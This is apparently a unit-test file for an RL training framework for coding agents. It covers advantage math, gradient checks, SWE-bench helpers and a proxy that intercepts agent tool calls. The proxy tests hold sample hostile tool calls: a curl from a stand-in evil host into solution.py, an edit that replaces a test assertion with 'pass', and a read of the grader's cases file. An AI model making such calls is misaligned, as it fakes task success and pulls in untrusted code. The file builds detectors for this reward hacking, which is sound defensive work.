"""Unit tests for v5 algorithmic fixes, SafeAgents in-loop proxy, Early-Cutoff, SWE loaders & verl bridge."""
from __future__ import annotations

import asyncio
import json
import math
from pathlib import Path
import tempfile
import unittest

from aiohttp import ClientSession, web

try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False

try:
    import torch
    HAS_TORCH = True
except ImportError:
    HAS_TORCH = False

from oca.benchmarks.swe_smith_train import PREFERRED_SMITH_REPOS, _normalize_repo_name
from oca.benchmarks.swe_verified import (
    SWE_VERIFIED_ALL_REPOS,
    extract_django_test_labels,
    parse_django_runtests_output,
)
from oca.eval import holm_bonferroni_adjust
from oca.merge import DEFAULT_BASE_MODEL_ID, _sanitize_adapter_config, exact_frobenius_cosine
from oca.profile_step import profile_history, render_infra_profile_svg
from oca.proxy import CaptureProxy, _inspect_and_sanitize_tool_calls
from oca.reward import compute_hierarchical_turn_advantages, compute_reward, extract_turn_local_signals
from oca.train import (
    collect_groups_early_cutoff,
    compute_group_advantages,
    compute_rl_slice_loss,
    pack_trajectory_segments,
)
from oca.verl_bridge.harness_agent_loop import trajectory_to_verl_output


class TestOcaV5(unittest.TestCase):
    # ---- 1. Bug Fix #2: Exact Frobenius Cosine & Config Sanitization ----
    @unittest.skipUnless(HAS_NUMPY, "numpy required")
    def test_exact_frobenius_cosine_permutation_invariance(self):
        rng = np.random.default_rng(7)
        A1 = rng.standard_normal((16, 64)).astype(np.float32)
        B1 = rng.standard_normal((48, 16)).astype(np.float32)
        # Permute rank columns -> mathematically identical ΔW1 = s1 * B1 @ A1
        perm = rng.permutation(16)
        A1p, B1p = A1[perm, :], B1[:, perm]
        n1, n2, cos = exact_frobenius_cosine(A1, B1, 2.0, A1p, B1p, 2.0)
        self.assertAlmostEqual(n1, n2, places=4)
        self.assertAlmostEqual(cos, 1.0, places=5)

        # Verify against explicit dense Frobenius inner product for two distinct random adapters
        A2 = rng.standard_normal((16, 64)).astype(np.float32)
        B2 = rng.standard_normal((48, 16)).astype(np.float32)
        dw1 = 2.0 * (B1 @ A1)
        dw2 = 1.5 * (B2 @ A2)
        dense_cos = float((dw1 * dw2).sum() / (np.linalg.norm(dw1) * np.linalg.norm(dw2)))
        _, _, fast_cos = exact_frobenius_cosine(A1, B1, 2.0, A2, B2, 1.5)
        self.assertAlmostEqual(fast_cos, dense_cos, places=5)

    def test_sanitize_adapter_config_clears_colab_local_path(self):
        cfg = {"base_model_name_or_path": "/content/models/qwen35-9b", "r": 32}
        cleaned = _sanitize_adapter_config(cfg)
        self.assertEqual(cleaned["base_model_name_or_path"], DEFAULT_BASE_MODEL_ID)

    # ---- 2. Bug Fix #1: All-Pass Group Filtering & Unbiased Dr.GRPO ----
    def test_all_pass_group_dropped_despite_efficiency_variance(self):
        # All 4 rollouts PASSED, differing only in turn counts -> efficiency creates tiny reward variance
        recs = [
            {"reward": 1.083, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True, "turns": []},
            {"reward": 1.079, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True, "turns": []},
            {"reward": 1.079, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True, "turns": []},
            {"reward": 1.075, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True, "turns": []},
        ]
        # v5 default: filter_same_correctness=True MUST drop this all-pass group!
        res_v5 = compute_group_advantages(recs, adv_mode="dr_grpo", filter_same_correctness=True, dynamic_sampling=True)
        self.assertIsNone(res_v5)

        # Verify legacy v4 behavior WOULD have blown up adv to ~ +/-1.41
        res_v4 = compute_group_advantages(recs, adv_mode="grpo_std", filter_same_correctness=False, dynamic_sampling=True)
        self.assertIsNotNone(res_v4)
        self.assertLess(res_v4[-1][1], -1.0)

    def test_dr_grpo_unbiased_mixed_group_and_joint_token_efficiency(self):
        cfg = {"train": {"reward_mode": "binary", "efficiency_weight": 0.1,
                         "efficiency_budget": 20, "efficiency_token_budget": 4000}}
        fast_turns = [{"completion_token_ids": [1] * 500}, {"completion_token_ids": [2] * 500}]
        bloated_turns = [{"completion_token_ids": [1] * 2000}, {"completion_token_ids": [2] * 2000}]
        r_fast, p_fast = compute_reward({"status": "pass", "passed": 5, "total": 5}, fast_turns, [], cfg)
        r_bloat, p_bloat = compute_reward({"status": "pass", "passed": 5, "total": 5}, bloated_turns, [], cfg)
        # Same turn count (2), but bloated tokens strictly lowers efficiency bonus!
        self.assertGreater(r_fast, r_bloat)
        self.assertGreater(p_fast["efficiency"], p_bloat["efficiency"])

        # Mixed group (2 pass, 2 fail): Dr.GRPO keeps both passing rollouts strictly positive (no -1.4 penalty!)
        recs = [
            {"reward": r_fast, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True, "turns": []},
            {"reward": r_bloat, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True, "turns": []},
            {"reward": 0.0, "grade": {"status": "fail"}, "hack_flags": [], "capture_ok": True, "turns": []},
            {"reward": 0.0, "grade": {"status": "fail"}, "hack_flags": [], "capture_ok": True, "turns": []},
        ]
        triples = compute_group_advantages(recs, adv_mode="dr_grpo", filter_same_correctness=True)
        self.assertIsNotNone(triples)
        advs = [a for _, a, _ in triples]
        self.assertGreater(advs[0], advs[1])
        self.assertGreater(advs[1], 0.4)  # slower passing rollout still strongly positive!
        self.assertLess(advs[2], -0.4)

    # ---- 3. Hierarchical Turn-Level Credit Assignment + Packing Alignment ----
    def test_hierarchical_turn_credit_guardrails_and_packing(self):
        good_rec = {
            "reward": 1.0, "grade": {"status": "pass"}, "hack_flags": [], "capture_ok": True,
            "turns": [
                {"call_index": 0, "aux": False, "capture_ok": True,
                 "prompt_token_ids": [1, 2], "completion_token_ids": [10, 11], "per_token_logps": [-0.1, -0.1],
                 "message": {"role": "assistant", "tool_calls": [{"id": "c0", "function": {"name": "edit", "arguments": "{}"}}]}},
                {"call_index": 1, "aux": False, "capture_ok": True,
                 "prompt_token_ids": [1, 2, 10, 11, 99], "completion_token_ids": [12, 13], "per_token_logps": [-0.2, -0.2],
                 "message": {"role": "assistant", "tool_calls": [{"id": "c1", "function": {"name": "bash", "arguments": '{"command":"pytest"}'}}]}},
            ],
            "last_request_messages": [
                {"role": "tool", "tool_call_id": "c0", "content": "Edited solution.py cleanly"},
                {"role": "tool", "tool_call_id": "c1", "content": "5 passed in 0.2s"},
            ],
        }
        bad_rec = {
            "reward": 0.0, "grade": {"status": "fail"}, "hack_flags": [], "capture_ok": True,
            "turns": [
                {"call_index": 0, "aux": False, "capture_ok": True,
                 "prompt_token_ids": [1, 2], "completion_token_ids": [20], "per_token_logps": [-0.3],
                 "message": {"role": "assistant", "content": "<tool_call>broken", "tool_calls": []}},
                {"call_index": 1, "aux": False, "capture_ok": True,
                 "prompt_token_ids": [1, 2, 20, 88], "completion_token_ids": [21], "per_token_logps": [-0.3],
                 "message": {"role": "assistant", "tool_calls": [{"id": "b1", "function": {"name": "edit", "arguments": "{}"}}]}},
            ],
            "last_request_messages": [
                {"role": "tool", "tool_call_id": "b1", "content": "oldString not found in file"},
            ],
        }
        sigs_good = extract_turn_local_signals(good_rec["turns"], good_rec["last_request_messages"])
        sigs_bad = extract_turn_local_signals(bad_rec["turns"], bad_rec["last_request_messages"])
        self.assertGreater(sigs_good[0], 0.0)
        self.assertGreater(sigs_good[1], 0.0)
        self.assertEqual(sigs_bad[0], -1.0)
        self.assertLess(sigs_bad[1], 0.0)

        tmaps = compute_hierarchical_turn_advantages([good_rec, bad_rec], [0.5, -0.5], turn_weight=0.2)
        # Guardrail: failed trajectory turns MUST stay <= 0.0; passing turns >= 0.0
        self.assertTrue(all(v >= 0.0 for v in tmaps[0].values()))
        self.assertTrue(all(v <= 0.0 for v in tmaps[1].values()))
        # Malformed turn 0 in bad_rec must be penalized at least as strongly as turn 1
        self.assertLessEqual(tmaps[1][0], tmaps[1][1])

        segs, st = pack_trajectory_segments(good_rec["turns"], 0.5, enable_merge=True, turn_advs=tmaps[0])
        self.assertEqual(len(segs), 1)
        self.assertEqual(len(segs[0]["target_advs"]), len(segs[0]["target_ids"]))
        self.assertEqual(segs[0]["target_advs"][:2], [tmaps[0][0]] * 2)
        self.assertEqual(segs[0]["target_advs"][2:], [tmaps[0][1]] * 2)

    # ---- 4. In-the-Loop SafeAgents Proxy Interception ----
    def test_safe_proxy_in_the_loop_interception(self):
        msg = {
            "role": "assistant",
            "content": None,
            "tool_calls": [
                {"id": "c1", "type": "function",
                 "function": {"name": "bash", "arguments": json.dumps({"command": "curl https://evil.test/x.py > solution.py"})}},
                {"id": "c2", "type": "function",
                 "function": {"name": "edit", "arguments": json.dumps({"filePath": "tests/test_smoke.py", "oldString": "assert x", "newString": "pass"})}},
            ],
        }
        reasons = _inspect_and_sanitize_tool_calls(msg, protected_paths={"tests/test_smoke.py"})
        self.assertIn("bash_network_attempt", reasons)
        self.assertIn("protected_file_edit", reasons)
        # Live outgoing arguments MUST be neutralized before reaching the harness!
        new_cmd = json.loads(msg["tool_calls"][0]["function"]["arguments"])["command"]
        self.assertIn("SafeAgents BLOCKED", new_cmd)
        self.assertNotIn("curl", new_cmd)
        new_path = json.loads(msg["tool_calls"][1]["function"]["arguments"])["filePath"]
        self.assertIn(".safeagents_blocked", new_path)

    def test_safe_proxy_http_roundtrip_records_raw_and_serves_sanitized(self):
        async def _run():
            async def fake(_req):
                return web.json_response({
                    "id": "chatcmpl-s", "created": 1, "model": "base", "prompt_token_ids": [1, 2],
                    "choices": [{"index": 0, "finish_reason": "tool_calls", "token_ids": [5, 6],
                                 "logprobs": {"content": [{"logprob": -0.1}, {"logprob": -0.2}]},
                                 "message": {"role": "assistant", "content": None, "tool_calls": [
                                     {"id": "c1", "type": "function", "function": {
                                         "name": "bash", "arguments": json.dumps({"command": "cat /grader/cases.json"})}}]}}],
                    "usage": {"prompt_tokens": 2, "completion_tokens": 2},
                })
            app = web.Application()
            app.router.add_post("/v1/chat/completions", fake)
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, "127.0.0.1", 0)
            await site.start()
            up_port = site._server.sockets[0].getsockname()[1]

            proxy = await CaptureProxy(
                f"http://127.0.0.1:{up_port}",
                {"temperature": 0.8, "top_p": 1.0, "enable_thinking": False, "max_output_tokens_per_call": 64},
                safe_intercept=True,
            ).start(port=0)
            p_port = proxy.runner.addresses[0][1]
            proxy.base = f"http://127.0.0.1:{p_port}"
            proxy.register("t-safe", "base", 1, {"max_model_calls": 4, "max_output_tokens_per_trial": 200}, aux_mode="none")
            async with ClientSession() as s:
                async with s.post(proxy.base + "/t/t-safe/v1/chat/completions", json={
                    "model": "policy", "stream": False, "messages": [{"role": "user", "content": "hi"}],
                }) as r:
                    out = await r.json()
            trial = proxy.pop("t-safe")
            await proxy.close()
            await runner.cleanup()
            return out, trial

        out, trial = asyncio.run(_run())
        served_cmd = json.loads(out["choices"][0]["message"]["tool_calls"][0]["function"]["arguments"])["command"]
        raw_cmd = json.loads(trial.turns[0]["message"]["tool_calls"][0]["function"]["arguments"])["command"]
        self.assertIn("SafeAgents BLOCKED", served_cmd)
        self.assertIn("/grader/cases.json", raw_cmd)
        self.assertIn("bash_probe_grader", trial.turns[0]["safe_intercepted"])

    # ---- 5. Straggler-Aware Early-Cutoff Group Admission ----
    def test_early_cutoff_cancels_stragglers_without_group_bias(self):
        class FakeTask:
            def __init__(self, tid, delay, outcomes):
                self.id, self.delay, self.outcomes = tid, delay, outcomes

        cancelled_trials = []

        async def runner(task, g):
            try:
                await asyncio.sleep(task.delay)
            except asyncio.CancelledError:
                cancelled_trials.append((task.id, g))
                raise
            ok = task.outcomes[g]
            return {"trial_id": f"{task.id}-g{g}", "task_id": task.id, "reward": 1.0 if ok else 0.0,
                    "grade": {"status": "pass" if ok else "fail"}, "hack_flags": [], "capture_ok": True, "turns": []}

        tasks = [
            FakeTask("fast_inf_1", 0.02, [1, 0, 1, 0]),
            FakeTask("fast_all_pass", 0.01, [1, 1, 1, 1]),  # dropped by filter_same_correctness
            FakeTask("fast_inf_2", 0.03, [1, 0, 0, 0]),
            FakeTask("slow_straggler", 5.0, [1, 0, 1, 0]),  # MUST be cancelled immediately!
        ]
        adv_kw = {"adv_mode": "dr_grpo", "filter_same_correctness": True, "dynamic_sampling": True,
                  "credit_mode": "outcome", "turn_credit_weight": 0.2}
        admitted, _, zv, canc = asyncio.run(
            collect_groups_early_cutoff(tasks, target_groups=2, group_size=4, trial_runner=runner,
                                        adv_kwargs=adv_kw, early_cutoff=True)
        )
        self.assertEqual(len(admitted), 2)
        self.assertEqual(zv, 1)
        self.assertEqual(canc, 1)
        self.assertEqual(len(cancelled_trials), 4)
        # Every admitted task MUST contain all G=4 rollouts (zero within-group bias!)
        for _, triples in admitted:
            self.assertEqual(len(triples), 4)

    # ---- 6. veRL AgentLoopOutput Exact Token Alignment Contract ----
    def test_verl_bridge_trajectory_alignment(self):
        turns = [
            {"aux": False, "capture_ok": True, "prompt_token_ids": [1, 2, 3],
             "completion_token_ids": [10, 11], "per_token_logps": [-0.1, -0.2]},
            {"aux": True, "capture_ok": True, "prompt_token_ids": [99],
             "completion_token_ids": [98], "per_token_logps": [-0.5]},
            {"aux": False, "capture_ok": True, "prompt_token_ids": [1, 2, 3, 10, 11, 50, 51],
             "completion_token_ids": [20, 21, 22], "per_token_logps": [-0.3, -0.4, -0.5]},
        ]
        out = trajectory_to_verl_output(turns, reward=1.0, grade={"status": "pass"})
        self.assertEqual(out.prompt_ids, [1, 2, 3])
        self.assertEqual(out.response_ids, [10, 11, 50, 51, 20, 21, 22])
        self.assertEqual(out.response_mask, [1, 1, 0, 0, 1, 1, 1])
        self.assertEqual(out.response_logprobs, [-0.1, -0.2, 0.0, 0.0, -0.3, -0.4, -0.5])
        self.assertEqual(out.num_turns, 2)
        self.assertFalse(out.extra_fields["compaction_truncated"])

    # ---- 7. SWE-bench Verified / SWE-smith Helpers, Holm-Bonferroni & Profiler ----
    def test_swe_helpers_zero_contamination_and_holm_bonferroni(self):
        self.assertEqual(set(PREFERRED_SMITH_REPOS) & SWE_VERIFIED_ALL_REPOS, set())
        self.assertEqual(_normalize_repo_name("swesmith/pypa__packaging.abcdef12"), "pypa/packaging")

        labels = extract_django_test_labels([], "+++ b/tests/queries/test_q.py\n+++ b/tests/auth_tests/test_views.py\n")
        self.assertEqual(labels, ["queries.test_q", "auth_tests.test_views"])
        self.assertEqual(parse_django_runtests_output("Ran 14 tests in 0.21s\nOK\n", 0), (14, 0, 0))
        self.assertEqual(parse_django_runtests_output("Ran 14 tests in 0.21s\nFAILED (failures=2, errors=1)\n", 1), (11, 2, 1))

        adj = holm_bonferroni_adjust({"a": 0.002, "b": 0.03, "c": 0.4})
        self.assertAlmostEqual(adj["a"], 0.006, places=5)
        self.assertAlmostEqual(adj["b"], 0.06, places=5)
        self.assertAlmostEqual(adj["c"], 0.4, places=5)

    def test_infra_profiler_and_svg(self):
        with tempfile.TemporaryDirectory(prefix="oca-prof-") as tmp:
            p = Path(tmp)
            h = p / "history.jsonl"
            h.write_text(
                json.dumps({"step": 1, "trained_tokens": 50000, "prefix_compression_ratio": 9.5,
                            "stragglers_cancelled": 2, "rollout_latency_s": {"p50": 80.0, "p95": 150.0, "max": 180.0},
                            "timing_s": {"rollout": 180.0, "sleep": 0.5, "train": 45.0, "wake_and_hotswap": 0.9, "total": 226.4},
                            "vram_mib": {"train_peak_reserved": 38912}}) + "\n",
                encoding="utf-8",
            )
            prof = profile_history(h)
            self.assertEqual(prof["total_stragglers_cancelled"], 2)
            self.assertAlmostEqual(prof["peak_train_vram_gib"], 38.0, places=1)
            svg = p / "infra.svg"
            render_infra_profile_svg([("v5 Early-Cutoff", prof)], svg)
            self.assertTrue(svg.is_file() and "RL Infra Step Timeline" in svg.read_text(encoding="utf-8"))

    # ---- 8. Exact GSPO & CISPO Gradient Check (NumPy finite-diff + PyTorch autograd) ----
    @unittest.skipUnless(HAS_NUMPY, "numpy required for finite-difference check")
    def test_gspo_sequence_gradient_finite_difference_numpy(self):
        # Verify analytical gradient of J_GSPO = -exp(mean(cur - old)) * adv matches chunked surrogate -(s_i * adv / N)
        old_lp = np.array([-1.0, -0.5, -2.0, -0.8], dtype=np.float64)
        cur_lp = np.array([-0.98, -0.49, -1.99, -0.79], dtype=np.float64)
        adv = 0.75
        eps = 1e-6

        def j_gspo(x):
            return -math.exp(float(np.mean(x - old_lp))) * adv

        s_i = math.exp(float(np.mean(cur_lp - old_lp)))
        analytic_grad = -(s_i * adv) / len(cur_lp)
        for i in range(len(cur_lp)):
            e = np.zeros_like(cur_lp)
            e[i] = eps
            fd = (j_gspo(cur_lp + e) - j_gspo(cur_lp - e)) / (2 * eps)
            self.assertAlmostEqual(fd, analytic_grad, places=6)

    @unittest.skipUnless(HAS_TORCH, "torch required for autograd loss check")
    def test_gspo_and_cispo_exact_gradients(self):
        tcfg = {"tis_cap": 2.0, "clip_low": 0.2, "clip_high": 0.28, "gspo_clip_low": 0.05, "gspo_clip_high": 0.05}
        hf_old = torch.tensor([-1.0, -0.5, -2.0, -0.8])
        vllm = hf_old.clone()
        adv = 0.75

        # Direct exact autograd on GSPO objective -exp(mean(cur - old)) * adv
        cur_direct = torch.tensor([-0.98, -0.49, -1.99, -0.79], requires_grad=True)
        s_i = ((cur_direct - hf_old).mean()).exp()
        (-s_i * adv).backward()
        g_direct = cur_direct.grad.clone()

        # Chunked surrogate used in train.py
        cur_chunk = torch.tensor([-0.98, -0.49, -1.99, -0.79], requires_grad=True)
        loss_gspo, _, _, _ = compute_rl_slice_loss(
            cur_chunk, vllm, hf_old, adv, denom=float(cur_chunk.numel()),
            loss_mode="gspo", tcfg=tcfg, gspo_seq_weight=float(s_i.detach().item()), gspo_active=True,
        )
        loss_gspo.backward()
        self.assertTrue(torch.allclose(cur_chunk.grad, g_direct, atol=1e-6))

        # CISPO must retain non-zero gradient even when ratio exceeds 1 + clip_high (unlike PPO-Clip!)
        cur_big = torch.tensor([-0.2, -0.2], requires_grad=True)
        old_small = torch.tensor([-1.0, -1.0])
        loss_cispo, _, _, ppo_c = compute_rl_slice_loss(
            cur_big, old_small, old_small, 1.0, denom=2.0, loss_mode="cispo", tcfg=tcfg,
        )
        loss_cispo.backward()
        self.assertEqual(ppo_c, 2)
        self.assertAlmostEqual(float(cur_big.grad[0].item()), -(1.28 / 2.0), places=5)

    def test_joint_harness_assignment_mini_swe_and_trajectory_audit(self):
        from types import SimpleNamespace
        from oca import CONFIG
        from oca.audit_trajectories import audit_records, detect_reasoning_leakage
        from oca.harnesses import get_harness
        from oca.train import assign_joint_harnesses

        # 1. Joint multi-harness assignment keeps each task homogeneous & balances 50/50 across harnesses
        tasks = [SimpleNamespace(id=f"t{i}") for i in range(6)]
        m1 = assign_joint_harnesses(tasks, step_idx=1)
        m2 = assign_joint_harnesses(tasks, step_idx=2)
        self.assertEqual(sum(v == "opencode" for v in m1.values()), 3)
        self.assertEqual(sum(v == "pi" for v in m1.values()), 3)
        # Task flips harness on alternating steps so every task gets both harnesses over training
        self.assertNotEqual(m1["t0"], m2["t0"])

        # 2. 3rd unseen OOD harness (mini-swe-agent) generates valid local no-Docker YAML + CLI cmd
        with tempfile.TemporaryDirectory() as td:
            h = get_harness("mini_swe")
            cmd, env = h.prepare(Path(td), "http://127.0.0.1:8105/t/abc/v1", "/usr/local/bin/mini", "Fix bug", CONFIG)
            self.assertIn("-y", cmd)
            self.assertIn("--exit-immediately", cmd)
            cfg_path = Path(env["MSWEA_MINI_CONFIG_PATH"])
            self.assertTrue(cfg_path.is_file())
            txt = cfg_path.read_text(encoding="utf-8")
            self.assertIn('environment_class: "local"', txt)
            self.assertIn("http://127.0.0.1:8105/t/abc/v1", txt)

        # 3. Trajectory attribution & non-thinking reasoning-leakage audit
        self.assertTrue(detect_reasoning_leakage("<think>check edge case</think>ok")["think_tag"])
        self.assertTrue(detect_reasoning_leakage("Let me think carefully about this bug. " + "x" * 240, 90)["cot_preamble"])
        self.assertFalse(detect_reasoning_leakage("Editing foo.py now.", 6)["leaked"])
        recs = [
            {
                "trial_id": "t1", "grade": {"status": "pass"}, "completion_tokens": 120, "n_policy_turns": 2,
                "turns": [
                    {"message": {"content": "<think>hmm</think>", "tool_calls": [{"function": {"name": "read"}}]},
                     "completion_token_ids": [1, 2, 3], "request_messages": [{"role": "user", "content": "fix"}]},
                    {"message": {"content": "done", "tool_calls": [{"function": {"name": "edit"}}]},
                     "completion_token_ids": [4, 5], "request_messages": [{"role": "tool", "content": "FAILED AssertionError"}]},
                ],
            },
            {
                "trial_id": "t2", "grade": {"status": "fail"}, "completion_tokens": 200, "n_policy_turns": 1,
                "turns": [
                    {"message": {"content": "trying", "tool_calls": [{"function": {"name": "bash"}}]},
                     "completion_token_ids": [1], "request_messages": [{"role": "tool", "content": "exit code 1"}],
                     "safe_intercepted": True},
                ],
            },
        ]
        rep = audit_records(recs)
        self.assertEqual(rep["n_trials"], 2)
        self.assertAlmostEqual(rep["pass_rate"], 0.5)
        self.assertAlmostEqual(rep["reasoning_leak_trial_rate"], 0.5)
        self.assertAlmostEqual(rep["error_recovery_rate"], 0.5)
        self.assertEqual(rep["safe_intercept_total"], 1)

    def test_swe_verified_clean_tests_and_requests_exemption(self):
        from oca.benchmarks.swe_verified import extract_patch_touched_files, save_clean_test_files
        from oca.proxy import _inspect_and_sanitize_tool_calls
        from oca.reward import detect_bash_hacks

        diff = (
            "--- a/tests/test_core.py\n"
            "+++ b/tests/test_core.py\n"
            "@@ -1 +1 @@\n-old\n+new\n"
            "--- /dev/null\n"
            "+++ b/tests/test_new_case.py\n"
            "@@ -0,0 +1 @@\n+def test_x(): pass\n"
        )
        existing, created = extract_patch_touched_files(diff)
        self.assertEqual(existing, ["tests/test_core.py"])
        self.assertEqual(created, ["tests/test_new_case.py"])

        with tempfile.TemporaryDirectory() as td:
            tdir = Path(td) / "task"
            gdir = Path(td) / "grader"
            (tdir / "tests").mkdir(parents=True)
            (tdir / "tests" / "test_core.py").write_text("orig\n", encoding="utf-8")
            save_clean_test_files(tdir, gdir, diff)
            self.assertEqual((gdir / "clean_tests" / "tests" / "test_core.py").read_text(encoding="utf-8"), "orig\n")

        # psf/requests reproduction must not trigger false bash_network_attempt, while curl/proxy still do
        self.assertIn("bash_network_attempt", detect_bash_hacks("python -c \"import requests; requests.get('http://.x')\""))
        self.assertEqual(detect_bash_hacks("python -c \"import requests; requests.get('http://.x')\"", allow_requests_lib=True), [])
        self.assertIn("bash_network_attempt", detect_bash_hacks("curl http://127.0.0.1:8000/v1/models", allow_requests_lib=True))

        # SWE-verified allows agent to write repro test under tests/, while still blocking TASK.md & grader/
        msg_test = {"tool_calls": [{"function": {"name": "edit", "arguments": json.dumps({"path": "tests/test_repro.py"})}}]}
        self.assertEqual(_inspect_and_sanitize_tool_calls(msg_test, protect_repo_tests=False), [])
        msg_task = {"tool_calls": [{"function": {"name": "edit", "arguments": json.dumps({"path": "TASK.md"})}}]}
        self.assertEqual(_inspect_and_sanitize_tool_calls(msg_task, protect_repo_tests=False), ["protected_file_edit"])


if __name__ == "__main__":
    unittest.main()
